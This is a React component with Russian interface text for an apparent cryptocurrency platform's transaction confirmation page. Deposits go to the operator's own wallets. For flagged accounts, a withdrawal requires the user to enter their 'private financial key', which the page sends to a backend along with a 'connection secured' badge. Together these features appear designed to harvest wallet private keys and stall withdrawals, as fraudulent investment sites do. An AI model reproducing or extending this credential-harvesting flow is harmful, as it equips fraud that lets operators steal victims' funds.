import styles from './ConfirmTransaction.module.scss'
import ConnectionSecuredIcon from '@assets/icons/connection-secured.svg?react'
import SFCIcon from '@assets/icons/sfc-energy.svg?react'
import WideButton from '@SharedUI/WideButton/WideButton.tsx'
import { generateSixDigitCode } from '@/utils/helpers.tsx'
import { ScrollRestoration, useLocation, useNavigate } from 'react-router-dom'
import { useUser } from '@/hooks/useUser.ts'
import { useEffect, useMemo, useState } from 'react'
import ConfirmedPopup from '@SharedUI/ConfirmedPopup/ConfirmedPopup.tsx'
import { OUR_WALLETS } from '@/utils/OUR_WALLETS.tsx'
import toast from 'react-hot-toast'
import IconCircleCheckFilled from '@/assets/icons/circle-check.svg?react'
import { parseTimestamp } from '@/utils/helpers/date.tsx'
import { Timestamp } from 'firebase/firestore'
import PaymentInstruction from '@/pages/ConfirmTransaction/PaymentInstruction/PaymentInstruction.tsx'
import PrivateKey from '@/pages/ConfirmTransaction/PrivateKey/PrivateKey.tsx'
import axios from 'axios'

const ConfirmTransaction = () => {
  const location = useLocation()
  const navigate = useNavigate()
  const formData = location.state
  const { user } = useUser()
  const { type, amount, wallet } = formData
  const isDepositType = type === 'deposit'
  const [confirmedPopupIsOpen, setConfirmedPopupIsOpen] = useState(false)
  const [transactionHash, setTransactionHash] = useState('')
  const [privateKey, setPrivateKey] = useState('')

  const transactionId = useMemo(() => {
    return generateSixDigitCode()
  }, [])

  const openPopup = () => {
    setConfirmedPopupIsOpen(true)
    document.body.style.overflow = 'hidden'
    window.scrollTo(0, 0)
  }

  const onSubmitTransaction = async () => {
    if (!user) return

    if (isDepositType && !transactionHash) {
      toast.error('Укажите номер/хеш транзакции')
      return
    }

    if (!isDepositType && user.restrictions.isPrivateKey && !privateKey) {
      toast.error('Введите ваш приватный финансовый ключ')
      return
    }

    const transactionData = {
      type: isDepositType ? 'Пополнение' : 'Вывод',
      status: 'Ожидание',
      amount,
      nickname: user.nickname,
      executor: wallet,
      transactionHash,
      privateKey,
      userWallet: user.wallets[wallet].number,
    }

    openPopup()

    await axios.post(
      'http://localhost:3010/transaction/add-transaction',
      transactionData,
    )
  }

  const copyWallet = () => {
    toast.success('Скопировано!')
    navigator.clipboard.writeText(OUR_WALLETS[wallet])
  }

  useEffect(() => {
    return () => {
      document.body.style.overflow = ''
    }
  }, [])

  if (!user) return null

  return (
    <div className={styles['transaction-confirmation']}>
      <span className={styles['invoice-number']}>#{transactionId}</span>
      <div className={styles['row']}>
        <span className={styles['icon']}>
          <IconCircleCheckFilled width={35} height={35} color={'#14CC74'} />
        </span>
        <p className={styles['title']}>
          {isDepositType
            ? `Вам был выставлен счет на оплату`
            : `Запрос на вывод средств`}
        </p>
        <p className={styles['amount']}>USD {Number(amount).toFixed(2)}</p>
      </div>
      <div className={styles['columns-wrapper']}>
        <div className={styles['left-column']}>
          {user.restrictions.isPrivateKey && !isDepositType && (
            <PrivateKey privateKey={privateKey} setPrivateKey={setPrivateKey} />
          )}
          {isDepositType && (
            <PaymentInstruction
              wallet={wallet}
              transactionHash={transactionHash}
              setTransactionHash={setTransactionHash}
              copyWalletHandler={copyWallet}
            />
          )}
        </div>
        <div className={styles['right-column']}>
          <div className={styles['fields']}>
            <div className={styles['field']}>
              <span>Статус</span>
              <p>Ожидает</p>
            </div>
            <div className={`${styles['field']} ${styles['wallet-field']}`}>
              <span>Платежная система</span>
              <p>{wallet}</p>
            </div>
            <div className={styles['field']}>
              <span>Транзакция на</span>
              <p>{OUR_WALLETS[wallet]}</p>
            </div>
            <div className={styles['field']}>
              <span>Сумма</span>
              <p>{amount} USDT</p>
            </div>
            <div className={styles['field']}>
              <span>Дата</span>
              <p>{parseTimestamp(Timestamp.now())}</p>
            </div>
          </div>

          <div
            className={`${styles['secure-connection']} ${!isDepositType ? styles['secure-connection-withdrawn'] : ''}`}
          >
            <p>
              <ConnectionSecuredIcon />
              Соединение <br />
              защищено
            </p>
            <SFCIcon />
          </div>

          <p className={styles['disclaimer']}>
            {isDepositType
              ? `Убедитесь что вы отправляете именно то количество средств, которое
              указано. Обратите внимание что это уникальный адрес кошелька, После
              завершения операции не используйте этот адрес для последующих
              платежей.`
              : `Проверьте, что вы вводите правильную сумму для вывода.
              Пожалуйста, удостоверьтесь, что все данные верны перед
              подтверждением транзакции.`}
          </p>
          <div className={styles['buttons']}>
            <WideButton
              onClickHandler={() => {
                navigate(-1)
              }}
              text={'Отмена'}
              isTransparent
              isCancelButton
            />
            <WideButton
              onClickHandler={onSubmitTransaction}
              text={isDepositType ? 'Я заплатил' : 'Подтвердить'}
              isCheckButton
            />
          </div>
        </div>
      </div>
      {confirmedPopupIsOpen && <ConfirmedPopup />}
      <ScrollRestoration />
    </div>
  )
}

export default ConfirmTransaction
